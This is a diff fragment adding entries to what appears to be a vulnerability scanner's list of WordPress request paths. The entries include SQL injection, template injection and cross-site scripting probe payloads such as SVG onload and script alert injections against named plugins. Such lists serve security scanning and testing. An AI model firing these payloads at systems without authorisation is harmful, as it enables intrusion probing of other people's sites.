@@ -1112,3 +1112,6 @@
 {{pagepath}}cfsPreFill=1&first_name=%7B%7B{{num1}}*{{num2}}%7D%7D
 /wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
 /?action=shield_action&ex=display_full_page_dynamic&render_slug=render_shield_wploginreplica_header&title=nuclei&message=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/?_wplogin=35fe7057ffed92ff7bc5a0b90f302a77fb5843ad6c972294d68da0b0553b3900
+/ngg_tag/cve-2026-28141%22%3E%3Csvg%2Fonload%3Dalert%60{{marker}}%60%3E/
+/wp-json/essential-blocks/v1/products?per_page=20
